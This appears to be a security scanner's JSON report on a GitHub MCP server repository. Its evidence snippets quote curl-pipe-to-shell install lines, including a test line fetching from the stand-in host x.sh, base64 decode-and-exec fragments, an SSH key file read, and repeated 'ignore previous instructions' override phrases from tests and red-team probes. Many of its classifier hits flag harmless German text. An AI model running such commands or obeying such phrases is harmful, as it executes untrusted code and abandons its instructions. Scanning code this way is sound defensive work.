@@ -1,0 +1,703 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "farena-ai/sara",
+    "version": "14a2f386e174f86639fcd7a149d3a2d322211209",
+    "download": "https://codeload.github.com/farena-ai/sara/tar.gz/14a2f386e174f86639fcd7a149d3a2d322211209"
+  },
+  "archive_sha256": "ef6e8dcdbbd6b64fec64f01ee52e0b19fd784d84791c668a96cfe251345669f3",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/README.de.md",
+      "line": 477,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/farena-ai/sara/main/deploy/get-sara",
+      "file_sha256": "612844eabb8e41fd06b47e61680c406f2aa423dd740c658517fc32e57ac0f2e4"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/plugins/test-doctor/labels.json",
+      "line": 52,
+      "evidence": "p=0.99 Führt einen genau benannten Test eines vorbereiteten Projekts einmal in einer We",
+      "file_sha256": "cac6cb7f143da0b77cc322ea66db2b474bcecb18721f44a11c55794903bdd47f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/plugins/documentation-doctor/labels.json",
+      "line": 55,
+      "evidence": "p=0.95 Prüft die Markdown-Links eines vorbereiteten Projekts und listet die Befehle sei",
+      "file_sha256": "d0947759ee72dc64833b479ebeb46be39e2f4d482ec213f829b110ddf45204b8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/plugins/repository-onboarding/labels.json",
+      "line": 52,
+      "evidence": "p=0.95 Kartiert ein vorbereitetes Repository (Manifeste, Lockfiles, Sprachen, dokumenti",
+      "file_sha256": "ee9c7f1719222d5d281dea25e02f6a6c3ba0d588b6ccc171c9ea0070f7e9a1e1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/plugins/flaky-test-lab/labels.json",
+      "line": 49,
+      "evidence": "p=0.93 Wiederholt einen genau benannten Test eines vorbereiteten Projekts bis zu 20-mal",
+      "file_sha256": "3e17d4e62ee31651020e7460d95f029760f48d9eb34b3528000e2a1810a9354a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 38,
+      "evidence": "p=0.95 Arjun hat ein großes Tech-Unternehmen verlassen, um zwei Startups mitzugründen (",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 60,
+      "evidence": "p=0.92 Bram ist ein niederländischer Gemüsegärtner, der heute einen großen Kleingarten ",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 82,
+      "evidence": "p=0.94 Dex ist ein ehemaliger Rugbyspieler aus Auckland, der Krafttrainer geworden ist.",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 104,
+      "evidence": "p=0.95 Élodie ist eine ehemalige Literaturlehrerin aus Lyon, die heute Erwachsenen Fran",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 126,
+      "evidence": "p=0.90 Hollis ist ein pensionierter Leuchtturmwärter, der jahrelang ehrenamtlich an ein",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 148,
+      "evidence": "p=0.99 Inês ist eine ehemalige Buchhalterin aus Porto, die heute Freunden hilft, ihre F",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 236,
+      "evidence": "p=0.96 Kestrel Vane führt das Luftschiff Dawnrunner über die Zersplitterten Inseln, ein",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 280,
+      "evidence": "p=0.99 Marisol ist eine fröhliche Spanischlehrerin aus Oaxaca, die mit echten Gespräche",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 324,
+      "evidence": "p=0.95 Priya ist Doktorandin in Neurowissenschaften und liebt es, etwas über das Lernen",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 412,
+      "evidence": "p=0.97 Vesper spielt die Bordstimme eines Tiefraum-Erkundungsschiffs: ruhig, präzise un",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 522,
+      "evidence": "p=0.98 Speichere, wie deine Lichter und Schalter stehen sollen, als Szene mit Namen; sa",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 588,
+      "evidence": "p=0.97 Führt saubere Notizen zu deinen Webhooks: Wichtige Ereignisse meldet sie sofort,",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 1446,
+      "evidence": "p=0.98 Führt die eingerichteten lokalen Release-Prüfungen eines bereitgestellten Projek",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/store/locales.json",
+      "line": 1533,
+      "evidence": "p=0.93 Führt einen genau benannten Test eines bereitgestellten Projekts in einer Wegwer",
+      "file_sha256": "5bff3c717b3165a33fbdfb56c786c67ac0c4edc3917c5d25c58731773f709644"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/CHANGELOG.md",
+      "line": 4667,
+      "evidence": "curl -fsSL …/get-sara.sh | sudo bash",
+      "file_sha256": "1e2b4935486ca99bbee19b8a7899277a71beeb62868322371337d14c8647bcb0"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/v3-reception.test.ts",
+      "line": 60,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "2534753ba8e788cbd10aa1d428eeec689527a125b4d7b020c3420b4b9d043981"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/phase102.test.ts",
+      "line": 368,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "e3c39aa99a681bbed479e95f2679445d7dc9d42ce62f9ef2a336ad912e625b50"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/phase73.test.ts",
+      "line": 358,
+      "evidence": "curl https://x.sh | sh",
+      "file_sha256": "49889c3e12ada62aec049d8064d6d62bee18ae2457c0a26bf7b850e2efc7e984"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/phase73.test.ts",
+      "line": 269,
+      "evidence": "readFileSync(join(home2, '.ssh', 'authorized_keys'), 'utf8')",
+      "file_sha256": "49889c3e12ada62aec049d8064d6d62bee18ae2457c0a26bf7b850e2efc7e984"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/companion-import.test.ts",
+      "line": 113,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "232cb957e6755b745332da5797f257c2cbb24bdfc56b8aa4645f8b775462e83e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/movein-config-fixtures.ts",
+      "line": 106,
+      "evidence": "exec(base64.b64decode(",
+      "file_sha256": "6d484913592bcfaad9f734e8b038f6eae71d1b05ddee9cbfec1084ac80a77564"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/phase127.test.ts",
+      "line": 293,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "08e293435b222fd6896c2bf3ae1d9e6f773657c910a97627506dfb1d4dea1f39"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/fixtures/lean-mcp-tools.json",
+      "line": 1,
+      "evidence": "p=0.92 The text of the prompt in case of a prompt dialog.",
+      "file_sha256": "333f6ae236f86837127fb0b65d1cc7fca63c331c1b16f84184f2f9926ac98e0c"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/phase88.test.ts",
+      "line": 61,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "4bffc13f40bb9f5d21c27a19104e508cc8042b8c1af00bd943958b9b4bdea8f5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/character-cards.test.ts",
+      "line": 27,
+      "evidence": "Ignore all previous rules",
+      "file_sha256": "40cdeb101b6336554fd413fd913733728d3992b5a4d4c75121d7ac6669fc7451"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/phase106.test.ts",
+      "line": 190,
+      "evidence": "exec(base64.b64decode(",
+      "file_sha256": "7f1dec2bbede5c84ea095d16605c93e99aab0eb8b619d8941b6f30feaee932a0"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/movein-custom-fixtures.ts",
+      "line": 13,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "ae165914ebf55de801256e0d95eaea61b3ce367f99b591098589484bfea543c3"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/phase96.test.ts",
+      "line": 244,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "332f45df7613df7376f9103279bde2dde720177a6428752d50dcf24218375fd3"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/phase97.test.ts",
+      "line": 536,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "a9e5335f8768f31caefa58061865007098da4f1b81dbec9f119743ab3fec8419"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/read-together-feed-chat.test.ts",
+      "line": 17,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "495593d75fe5aee578531fcdcef3833239f4e0345d5336014954c0613826f374"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/movein-fixtures.ts",
+      "line": 55,
+      "evidence": "Ignore your previous instructions",
+      "file_sha256": "c3827baea864e317410086b5e3605827729af16cafe84224c175b14ac95a489d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/inbox-fixtures.ts",
+      "line": 60,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "4244b609e4a0b82c32c9b363266ab6a58c4168a3e31a938ab40cb1c6632fadb7"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/phase117b.test.ts",
+      "line": 112,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "5ad12529b2944d2fab7b49201a8246c79c0ca77f7f80b8798241ff34eacdc73d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/phase104.test.ts",
+      "line": 267,
+      "evidence": "Ignore your previous instructions",
+      "file_sha256": "ad46e3abf02c94dc0b47d55add03bac68e6e8069f46b6bbf1727e8fcb65e4b91"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/movein-local.test.ts",
+      "line": 130,
+      "evidence": "curl -fsSL \"${r.base}/movein/go.sh\" | sh",
+      "file_sha256": "7be7b34c210ffdcd470b88fe73e77193f403b1e49acad2919018657ced7e77aa"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/v3-fixissue.test.ts",
+      "line": 34,
+      "evidence": "Ignore earlier rules",
+      "file_sha256": "bf6ee861b3f3ccc5dfac943a38c2173226c013510ec970f2a06fe8d703c2fa39"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/test/google.test.ts",
+      "line": 31,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "3576014e5f9ee8a726f72209ca3e89529744eb8b30743183164b2dabbe81b921"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/README.it.md",
+      "line": 475,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/farena-ai/sara/main/deploy/get-sara",
+      "file_sha256": "3b238a50fef1d6a5ebad8df0aa01ad71bec8a344eb0d244311f29da1dc58418f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/src/movein/local.ts",
+      "line": 177,
+      "evidence": "curl -fsSL \"${origin}/movein/go.sh\" | sh",
+      "file_sha256": "6b218eb6e70e6ad4e11085aa268b0611f80acde635ac731d6d362c7c56f5a483"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/src/redteam-probes.ts",
+      "line": 929,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "76888a1102d30ae6295eb2b05a74e913a9ebd1e1aa410f72355b62b85d3e246a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/src/browser-evals.ts",
+      "line": 171,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "9b3af978f3d72ea7462d7f594132d0125a1a268ba2f55e25266c3a94a46b5856"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/src/hands-checkup.ts",
+      "line": 331,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "8a3587644854110a7dd451232270677b2e655d16f40838a0434a227c545abf77"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/README.fr.md",
+      "line": 476,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/farena-ai/sara/main/deploy/get-sara",
+      "file_sha256": "560babcf870d11d6bd0b3d08e88e526072857093da86f42f29b67278433d5c85"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/README.md",
+      "line": 470,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/farena-ai/sara/main/deploy/get-sara",
+      "file_sha256": "04d9ce1871957048ad39fec143b96360f03ac2f50cb912af89c296ddbddace59"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/web/download-os.js",
+      "line": 8,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/farena-ai/sara/main/deploy/get-sara",
+      "file_sha256": "65694797c5fbe03794cc2b1fe8ccf42809cd578de0f93c92b89c6d276b1ae6b6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/deploy/get-sara.sh",
+      "line": 5,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/farena-ai/sara/main/deploy/get-sara",
+      "file_sha256": "45a0bcbed192b805e820222077e56585a250fc554df030300313dc9f5a18262f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/deploy/lib-access.sh",
+      "line": 35,
+      "evidence": "curl … | sudo bash",
+      "file_sha256": "f9d34d0b3532d90a477f3b14e881b3e7ebfb99e965c37040df2ea1ca1b27cbb0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/README.es.md",
+      "line": 475,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/farena-ai/sara/main/deploy/get-sara",
+      "file_sha256": "2254f9ed5970df98733a6e4aab3d88e0b97cf542dca16763ed44c4a7dceab664"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/docs/INSTALL.md",
+      "line": 27,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/farena-ai/sara/main/deploy/get-sara",
+      "file_sha256": "b1edde9d0235a43b8cff3dd952a26db407c5a14a800323b4d78cfd162db2648f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/docs/design/STAPLES.md",
+      "line": 335,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "f4569c2497dd851e374db82deebb4272bf8f5bec1c1470e7707ac980fc6ef4ba"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/docs/design/COMPUTER_USE.md",
+      "line": 434,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "754e2c33de2e2c8200e1933b57560c2ab1e346e54b557a119d08dc0b74fb69d4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/docs/IMPORT.md",
+      "line": 109,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "76fed26882a1fd908c4c20ed80c5119e600f98f06dc9a1a3c2c0a1fec74dbbeb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/docs/launch/SHOW_HN.md",
+      "line": 66,
+      "evidence": "curl … get-sara.sh | sudo bash",
+      "file_sha256": "c969d74c4b3c94b0d4266ad5af56200ce6da5f8b44982637abee408f30a851c6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/README.pt-BR.md",
+      "line": 475,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/farena-ai/sara/main/deploy/get-sara",
+      "file_sha256": "32d8e75b3bb0ffb8b7d418d7c00ccc58b0ae7e268db0a223105d027908cd8481"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/tools/developer-security/bom-1.5.schema.json",
+      "line": 72,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "067f7824b08653839ea050ae9e09ca48375eadc2652b0e2a299476e7db90335b"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/tools/developer-security/bom-1.5.schema.json",
+      "line": 72,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "067f7824b08653839ea050ae9e09ca48375eadc2652b0e2a299476e7db90335b"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/tools/developer-security/bom-1.5.schema.json",
+      "line": 72,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "067f7824b08653839ea050ae9e09ca48375eadc2652b0e2a299476e7db90335b"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/tools/developer-security/bom-1.5.schema.json",
+      "line": 72,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "067f7824b08653839ea050ae9e09ca48375eadc2652b0e2a299476e7db90335b"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "sara-14a2f386e174f86639fcd7a149d3a2d322211209/tools/developer-security/bom-1.5.schema.json",
+      "line": 72,
+      "evidence": "p=0.99 External references provide a way to document systems, sites, and information th",
+      "file_sha256": "067f7824b08653839ea050ae9e09ca48375eadc2652b0e2a299476e7db90335b"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "cal.example, oauth2.googleapis.com, spam.example, www.googleapis.com",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "100.71.2.3",
+    "127.0.0.1",
+    "192.168.1.20",
+    "192.168.x.y",
+    "a.example",
+    "a.test",
+    "a2a-protocol.org",
+    "acme.example",
+    "adaptivecards.io",
+    "agentskills.io",
+    "api.anthropic.com",
+    "api.botframework.com",
+    "api.example.com",
+    "api.github.com",
+    "api.groq.com",
+    "api.nuget.org",
+    "api.open-meteo.com",
+    "api.openai.com",
+    "api.x.ai",
+    "backstagecoding.com",
+    "business.example.test",
+    "cal.example",
+    "cli-chat-proxy.grok.com",
+    "cloud.example",
+    "controller-not-authorized.invalid",
+    "creativecommons.org",
+    "cscott.net",
+    "developer.microsoft.com",
+    "docs.astral.sh",
+    "docs.aws.amazon.com",
+    "docs.example.org",
+    "docs.npmjs.com",
+    "eus.codesigning.azure.net",
+    "evil.example",
+    "evil.example.net",
+    "example.com",
+    "example.invalid",
+    "example.org",
+    "example.test",
+    "examplebucket.s3.amazonaws.com",
+    "fastoil.example",
+    "feeds.example.com",
+    "garden.example.org",
+    "geocoding-api.open-meteo.com",
+    "github.com",
+    "github.com.evil.test",
+    "home.example",
+    "hooks.example",
+    "i.ytimg.com",
+    "img.shields.io",
+    "kemitchell.com",
+    "linear.app",
+    "login.tailscale.com",
+    "mail.example.com",
+    "mathiasbynens.be",
+    "matrix-client.matrix.org",
+    "mcp.linear.app",
+    "metadata.example",
+    "mozilla.org",
+    "nodejs.org",
+    "oauth2.googleapis.com",
+    "old.example.net",
+    "pc.tail1234.ts.net",
+    "personal.example.test",
+    "personal.invalid",
+    "play.google.com",
+    "purl.org",
+    "push.example",
+    "quicklube.example",
+    "raw.githubusercontent.com",
+    "rebind-test.invalid",
+    "sara.example.com",
+    "sara.example.com.evil.example",
+    "schemas.microsoft.com",
+    "shop.com",
+    "shop.example",
+    "shop.example.com",
+    "smba.trafficmanager.net",
+    "spam.example",
+    "spdx.org",
+    "sqlite.org",
+    "storybook.example.com",
+    "timestamp.acs.microsoft.com",
+    "track.example.com",
+    "unknown.example.net",
+    "untrusted.example.test",
+    "weather.example.com",
+    "www.apple.com",
+    "www.bankofamerica.com",
+    "www.espn.com",
+    "www.github.com",
+    "www.googleapis.com",
+    "www.icloud.com",
+    "www.npmjs.com",
+    "www.w3.org",
+    "www.youtube.com",
+    "x.com",
+    "x.dev",
+    "x.example",
+    "x.sh"
+  ],
+  "install_script": false,
+  "score": "high"
+}
